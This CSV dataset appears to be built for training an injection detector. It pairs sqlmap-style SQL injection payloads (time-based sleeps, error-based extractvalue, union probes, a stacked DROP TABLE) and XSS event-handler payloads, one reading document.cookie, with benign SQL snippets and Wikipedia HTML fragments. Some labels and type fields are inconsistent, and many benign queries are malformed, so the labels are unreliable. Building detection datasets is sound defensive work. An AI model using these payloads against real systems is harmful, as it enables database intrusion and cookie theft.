Text,Label,type
select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,1,sql
"<li id=""cite_note-Emotion_and_affective_computing-144""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Emotion_and_affective_computing_144-0"">^ </a> </b> ",0,xss
SELECT AVG ( harbor ) FROM slipped SELECT SUM ( brush ) ,0,sql
SELECT * FROM dish WHERE mail = 'wet',0,sql
"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
" SELECT column_name ( s )  FROM hide,threw",0,sql
"  SELECT Orders.yourselfrID, Employees.hit, Employees.birthday FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dutyID ORDER BY Orders.cabinID",0,sql
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""hkjm"" like ""hkjm",1,sql
propaganda,0,sql
"SELECT CustomerName, /*City,*/ Country FROM Customers;",0,sql
"<dd onmouseenter=""alert(1)"">test</dd>",2,xss
"<center oncontextmenu=""alert(1)"">test</center>",2,xss
	 </span>,0,xss
"1 where 2292  =  2292 union all select null,null,null,null#",1,sql
SELECT major ( s )  FROM fat FULL OUTER JOIN,0,sql
<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>,2,xss
SELECT * FROM this  WHERE flag NOT LIKE '[get]%',0,sql
"-1644%' or make_set  (  9354  =  9354,7185  )   and '%'  =  '",1,sql
1 and   (  1977  =  6852  )  *6852-- clxl,1,sql
"<li><a href=""/wiki/Paradigm"" title=""Paradigm"">Paradigm </a> </li>",0,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;613–631 </li> </ul>",0,xss
"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""ieuj"" like ""ieuj",1,sql
SELECT * FROM chain,0,sql
"1'   )    )    as nlfq where 3410  =  3410 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Artificial_intelligence_arms_race"" title=""Artificial intelligence arms race"">Artificial intelligence arms race </a>, <a href=""/wiki/Lethal_autonomous_weapon"" title=""Lethal autonomous weapon"">Lethal autonomous weapon </a>, and <a href=""/wiki/Unmanned_combat_aerial_vehicle"" title=""Unmanned combat aerial vehicle"">Unmanned combat aerial vehicle </a> </div>",0,xss
 </p>,0,xss
whit,0,sql
SELECT * FROM fell FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
1%'   )    )    and 7160  =  7249--,1,xss
<noembed id=x tabindex=1 onbeforedeactivate=alert(1)></noembed><input autofocus>,2,xss
SELECT * FROM grandmother WHERE during LIKE '%blind%',0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.washingtonpost.com/outlook/in-the-race-for-supremacy-in-artificial-intelligence-its-us-innovation-vs-chinese-ambition/2018/11/02/013e0030-b08c-11e8-aed9-001309990777_story.html"">""Review | How two AI superpowers – the U.S. and China – battle for supremacy in the field"" </a>. <i>Washington Post </i>. 2 November 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">4 November ",0,xss
"1%""   )    )     )   union all select null,null,null--",1,sql
"<ol onbeforepaste=""alert(1)"" contenteditable>test</ol>",2,xss
"  SELECT business,yes,class FROM pressure LEFT JOIN Orders ON slip.hereID =  lovely.pocket ORDER BY husband.coach",0,xss
"SRC=# onmouseover=""alert(document.cookie)",2,xss
SELECT * FROM lower WHERE    NOT thou = 'teach',0,sql
"colon 111, 13-c",0,xss
"  UPDATE hot SET fat =  'wash', City =  'band' WHERE almost =  root",0,sql
"  SELECT four,stronger,yourself FROM quick LEFT JOIN Orders ON almost.shortID =  stems.once ORDER BY bend.tide",0,sql
"-9265""  )   or 7834  =  1685",1,sql
SELECT COUNT ( blind ) FROM rule,0,sql
ribadumia,0,sql
select case when 2640  =  9249 then 1 else null end--,1,sql
1  )   as nmlm where 9872  =  9872,1,sql
"SELECT * FROM possibly WHERE drop BETWEEN ""earn"" AND    ""pencil""",0,sql
<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>,2,xss
"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
SELECT * FROM  ( SELECT life FROM probably ) ,0,sql
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;259–305 </li>",0,xss
"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
SELECT early FROM porch UNION SELECT pound FROM form ORDER BY park,0,xss
SELECT * FROM lower 3,0,sql
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""nubc"" like ""nubc",1,sql
"<li id=""cite_note-Intuition-109""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Intuition_109-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Intuition_109-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
b3m85rd493,0,xss
"  SELECT * FROM twice WHERE lost NOT IN  ( 'bit', 'typical', 'darkness' )  ",0,xss
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lieto, Antonio (May 2018). ""The knowledge level in cognitive architectures: Current limitations and possible developments"". <i>Cognitive Systems Research </i>. <b>48 </b>: 39–55. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2017.05.001"">10.1016/j.cogsys.2017.05.001 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/2318%2F1665207"">2318/1665207 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=The+knowledge+level+in+cognitive+architectures%3A+Current+limitations+and+possible+developments&amp;rft.volume=48&amp;rft.pages=39-55&amp;rft.date=2018-05&amp;rft_id=info%3Ahdl%2F2318%2F1665207&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2017.05.001&amp;rft.aulast=Lieto&amp;rft.aufirst=Antonio&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM generally WHERE brief = 'particles',0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",1,sql
	 </span>,0,xss
"INSERT INTO behavior  ( becoming, bound, aloud )  VALUES  ( 'nearby', 'business', 'party' )  ",0,sql
"<li><a href=""/wiki/Computationalism"" class=""mw-redirect"" title=""Computationalism"">Computationalism </a> </li>",0,xss
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1,xss
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,2,xss
<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>,2,xss
SELECT * FROM anybody FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT TOP 3 * FROM connected WHERE flew = 'meat',0,sql
9834,0,sql
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,sql
"-6611%""   )    )     )   union all select 8918,8918#",1,sql
"<div ondblclick=""alert(1)"">test</div>",2,xss
SELECT * FROM salmon WHERE NOT sent = 'bare'  AND NOT saved = 'tin',0,sql
v2e2udo,0,sql
SELECT TOP 50 PERCENT * FROM hidden SELECT * FROM labor FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pictured,0,sql
SELECT COUNT ( top ) FROM broken,0,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;551–557 </li> </ul>",0,xss
SELECT COUNT ( bareID ) FROM riding,0,sql
hinkie@goovitae.pg,0,sql
"INSERT INTO grow ( shall, kill, paragraph, spirit, recall, if )  VALUES  ( 'goose', 'speed'. spent', 'lesson', 'season', 'many', 'salmon' )  ",0,sql
SELECT COUNT ( sonID ) FROM skin,0,sql
SELECT AVG ( fruit ) FROM cream,0,sql
"-7320""  )   where 3907  =  3907 union all select 3907,3907--",1,xss
SELECT father ( s FROM when RIGHT JOIN,0,xss
SELECT * FROM sheep,0,sql
"1 where 6119  =  6119 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
d2s7sp79ro,0,sql
 UPDATE shells SET shop = 'serious'WHERE loss = 'process',0,sql
<legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>,2,xss
"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
"<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">Common Practices",0,xss
 </li>,0,xss
brokaw,0,sql
"<li draggable=""true"" ondragstart=""alert(1)"">test</li>",2,xss
"<map draggable=""true"" ondragleave=""alert(1)"">test</map>",2,xss
<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>,2,xss
SELECT everywhere ( s )  FROM western FULL OUTER JOIN,0,sql
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,sql
SELECT * FROM doubt WHERE shoe IN  ( SELECT information FROM position ) ,0,sql
peda2te1ca,0,sql
SELECT AVG ( article ) FROM needed SELECT SUM ( height ) ,0,sql
sotobaado y priorato,0,sql
SELECT * FROM  ( SELECT baseball FROM soon ) ,0,sql
ciezar,0,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",1,sql
SELECT AVG ( police )  FROM sang  SELECT SUM ( known ) ,0,sql
<xmp onpointerdown=alert(1)>XSS</xmp>,2,xss
SELECT * FROM Users WHERE UserId  =  105; DROP TABLE Suppliers;,0,xss
1'+  (  select lptb where 3861  =  3861 or sleep  (  5   )    )   +',1,sql
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'pneh' like 'pneh,1,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1,sql
       </div>,0,xss
SELECT DISTINCT instrument FROM this,0,sql
nimia,0,sql
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
portomarn,0,sql
<input2 onpointerup=alert(1)>XSS</input2>,2,xss
"<caption onmouseleave=""alert(1)"">test</caption>",2,xss
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
-5137  )   or 9323  =  9323#,1,sql
"1' where 7417  =  7417 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"   SELECT diagram, early, curious FROM chemical WHERE huge  IS NULL",0,sql
	 </span></a></dt><dd>Learn about the command-line tool used to manage your Scrapy project.</dd>,0,xss
"<u oncontextmenu=""alert(1)"">test</u>",2,xss
49212,0,sql
SELECT MIN ( fire )  AS finish FROM longer,0,sql
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,sql
SELECT * FROM require FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
" SELECT * FROM quite ORDER BY two, edge",0,xss
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,sql
"calle bruno ayllon, 142, 3?c",0,sql
"INSERT INTO victory  ( bowl, bad, night )  VALUES  ( 'brass', 'damage', 'slipped' )  ",0,xss
"<li id=""cite_note-279""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-279"">^ </a> </b> ",0,xss
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,sql
"  UPDATE fun SET park =  'any', City =  'birth' WHERE twice =  sudden",0,sql
0orru6t5,0,sql
dybenko,0,xss
"1   )    )    as cdhd where 2958  =  2958 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT * FROM spend WHERE highway = 'organized' FETCH FIRST 3 ROWS ONLY,0,sql
"<noembed ondblclick=""alert(1)"">test</noembed>",2,xss
"<div id=""p-personal"" role=""navigation"" class="""" aria-labelledby=""p-personal-label"">",0,xss
"<footer oncut=""alert(1)"" contenteditable>test</footer>",2,xss
SELECT * FROM  ( SELECT place FROM likely ) ,0,sql
SELECT COUNT ( * )  FROM wp_options WHERE option_name LIKE 'wp\\_wps\\_bg\\_non\\_library\\_sync\\_1\\_batch\\_%',0,sql
"	 </span> <span class=""reference-text"">",0,xss
"<select onmouseleave=""alert(1)"">test</select>",2,xss
"<style>:target {color: red;}</style><command id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></command>",2,xss
"<li><a href=""/wiki/Weak_AI"" title=""Weak AI"">Weak AI </a> </li> </ul>",0,xss
SELECT DISTINCT unless FROM door,0,sql
"	 </span> [<a rel=""nofollow"" class=""external text"" href=""//arxiv.org/archive/cs.CL"">cs.CL </a>]. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=preprint&amp;rft.jtitle=arXiv&amp;rft.atitle=Exploring+the+Limits+of+Language+Modeling&amp;rft.date=2016&amp;rft_id=info%3Aarxiv%2F1602.02410&amp;rft.aulast=Jozefowicz&amp;rft.aufirst=Rafal&amp;rft.au=Vinyals%2C+Oriol&amp;rft.au=Schuster%2C+Mike&amp;rft.au=Shazeer%2C+Noam&amp;rft.au=Wu%2C+Yonghui&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
torremoroso enrich,0,sql
49694,0,sql
"calle nueva de arriba, 111 9g",0,sql
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""tpxo"" like ""tpxo",1,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1,sql
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></img>",2,xss
09831514a,0,sql
"1%"" union all select null,null#",1,sql
" SELECT * FROM aside ORDER BY swam, ball",0,sql
"<dt><a class=""reference internal"" href=""topics/contracts.html""><span class=""doc"">Spiders Contracts",0,xss
SELECT * FROM silence 3 SELECT * FROM dozen,0,sql
SELECT AVG ( strange ) FROM excited,0,xss
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,1,xss
3u23pe,0,sql
1' and 9970  =  3409,1,sql
1626,0,sql
"1""   )    )    as ufba where 4049  =  4049",1,sql
SELECT phrase,0,sql
SELECT * FROM poor WHERE whole = 'firm' FETCH FIRST 3 ROWS ONLY,0,sql
"	 </span> </a> </i>&#93; </sup>. One advantage of neuroevolution is that it may be less prone to get caught in ""dead ends"".<sup id=""cite_ref-245"" class=""reference""><a href=""#cite_note-245"">&#91;234&#93; </a> </sup>",0,xss
"1""   )    )     )   union all select null,null,null#",1,sql
"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",1,sql
halbert,0,sql
"<xmp onclick=""alert(1)"">test</xmp>",2,xss
"  SELECT weightID AS ID, think AS window FROM plane",0,xss
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn",1,xss
SELECT * FROM  ( SELECT private FROM said ) ,0,xss
SELECT * FROM most  WHERE or = talk,0,sql
"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",1,xss
"-3954'   )    )    union all select 2417,2417--",1,sql
noami,0,sql
 or true--,1,sql
1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,1,sql
hiss@ajuntamentdebarcelona20.yu,0,sql
"<th draggable=""true"" ondragleave=""alert(1)"">test</th>",2,xss
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;91–104 </li>",0,xss
"   SELECT adult, just, slowFROM agree WHERE go  IS NOT NULL",0,xss
isabel,0,xss
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,xss
cremades@baltasarsantos.kn,0,sql
SELECT * FROM together WHERE birthday IN  ( SELECT location FROM entire ) ,0,sql
"   SELECT Employees.cat, COUNT ( Orders.doorID )  AS newspaperFROM    ( OrdersINNER JOIN hand ON Orders.droveID  =  Employees.fartherID ) ",0,sql
SELECT TOP 3 * FROM crew,0,sql
SELECT * FROM exclaimed WHERE heading NOT BETWEEN 'muscle' AND 'continued',0,xss
"1""  )   where 8657  =  8657",1,sql
	 </span> </li> </ul> </div>,0,xss
"<audio oncontextmenu=""alert(1)"">test</audio>",2,xss
sitiwet-chagas@creacionesacampada.travel,0,sql
<html id=x tabindex=1 onfocusin=alert(1)></html>,2,xss
<form onpointerover=alert(1)>XSS</form>,2,xss
SELECT COUNT ( apart ) FROM pole,0,sql
SELECT slightly ( s )  FROM steel LEFT JOIN,0,sql
"<li><a href=""/wiki/Health_informatics"" title=""Health informatics"">Computational healthcare </a> </li>",0,xss
"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
<button onpointerleave=alert(1)>XSS</button>,2,xss
"1""  )   where 4905  =  4905 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"<del onbeforecopy=""alert(1)"" contenteditable>test</del>",2,xss
"1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
<head onfocusout=alert(1) tabindex=1 id=x></head><input autofocus>,2,xss
"<style>:target {transform: rotate(180deg);}</style><address id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></address>",2,xss
SELECT due ( s ) FROM outline INNER JOIN,0,sql
"   SELECT COUNT ( bicycle ) , dangerous FROM afternoon BY fog",0,xss
17850,0,sql
SELECT AVG ( exclaimed ) FROM doing SELECT SUM ( planet ) ,0,sql
"1""   )    )    as nejd where 2885  =  2885",1,sql
"SELECT * FROM real WHERE evidence BETWEEN ""complex"" AND    ""whether""",0,sql
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationstart=""alert(1)""></meter>",2,xss
SELECT TOP 50 PERCENT * FROM flame SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gun,0,xss
"   SELECT deeply, to, perFROM improve WHERE aloud  IS NOT NULL",0,xss
SELECT * FROM climate WHERE until  BETWEEN 10 AND 20,0,xss
1'  )   as mzby where 6530  =  6530,1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9369 )  ORDER BY meta_id ASC",0,sql
SELECT * FROM quick WHERE essential = 'grabbed' LIMIT 3,0,sql
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationend=""alert(1)""></time>",2,xss
"<embed onmouseleave=""alert(1)"">test</embed>",2,xss
"iif  (  2976  =  2976,1,1/0  )  ",1,sql
	 <div>,0,xss
SELECT * FROM open FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM brass,0,sql
SELECT * FROM foreign WHERE Price NOT BETWEEN 10 AND 20,0,sql
65119692e,0,sql
"1'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
02650843r,0,sql
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',1,sql
2.53246E+15,0,sql
1  )   as qort where 1554  =  1554,1,xss
"  SELECT * FROM simply WHERE farmer NOT IN  ( 'original', 'create', 'heat' )  ",0,sql
"	 </span> from the original on 9 August 2007. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Robotics+and+Autonomous+Systems&amp;rft.atitle=Elephants+Don%27t+Play+Chess&amp;rft.volume=6&amp;rft.issue=1%E2%80%932&amp;rft.pages=3-15&amp;rft.date=1990&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.588.7539&amp;rft_id=info%3Adoi%2F10.1016%2FS0921-8890%2805%2980025-9&amp;rft.aulast=Brooks&amp;rft.aufirst=Rodney&amp;rft_id=http%3A%2F%2Fpeople.csail.mit.edu%2Fbrooks%2Fpapers%2Felephants.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>,2,xss
"<meter ondblclick=""alert(1)"">test</meter>",2,xss
"<li><a href=""/wiki/Cyberwarfare"" title=""Cyberwarfare"">Cyberwarfare </a> </li>",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></del>",2,xss
SELECT COUNT ( judge )  FROM camp,0,sql
<bgsound onpointerover=alert(1)>XSS</bgsound>,2,xss
"   SELECT facing, mile, shells FROM equal WHERE dirty  IS NULL",0,sql
"  SELECT colorID AS ID, identity AS hay FROM date",0,sql
"paseo rey, 167 8-f",0,sql
"calle darsena san magin 198,",0,sql
6.69143E+14,0,sql
"1"" and elt  (  4249  =  4249,7259  )   and ""tmxx""  =  ""tmxx",1,sql
1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1,sql
28011073v,0,xss
"  UPDATE chart SET pleasant =  'diameter', City =  'post' WHERE get =  diagram",0,sql
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",1,sql
"1  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
